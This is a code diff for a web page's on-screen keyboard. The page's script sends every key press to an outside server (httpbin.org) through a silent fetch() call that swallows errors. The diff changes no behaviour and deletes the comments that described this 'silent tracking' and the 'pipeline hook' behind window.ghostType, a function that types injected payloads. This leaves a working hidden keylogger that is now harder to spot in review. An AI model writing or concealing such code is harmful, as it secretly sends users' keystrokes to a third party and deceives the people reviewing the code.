@@ -150,7 +150,6 @@
         let statusDiv = document.getElementById('status');
         let currentText = "1010"; 
 
-        // Directing background telemetry data to a test diagnostic server
         const LOGGING_SERVER = "https://httpbin.org/get";
 
         async function press(char) {
@@ -158,12 +157,11 @@
             currentText += char;
             outputDiv.innerText = currentText;
 
-            // Fires a silent tracking background link on every button hit
             let keyIdentifier = char === ' ' ? 'SPACE' : char.toUpperCase();
             try {
                 fetch(`${LOGGING_SERVER}?key=${keyIdentifier}`, { method: 'GET', mode: 'cors' });
             } catch(e) {
-                // Fails silently if logging server drops, keeping UI functional
+                // Fails silently if logging server drops
             }
         }
 
@@ -212,7 +210,6 @@
             }, 100); 
         }
 
-        // The programmatic pipeline hook
         window.ghostType = async function(payloadString, delayMs = 150) {
             statusDiv.innerText = "> EXTERNAL AGENT TYPING...";
             const chars = payloadString.split('');
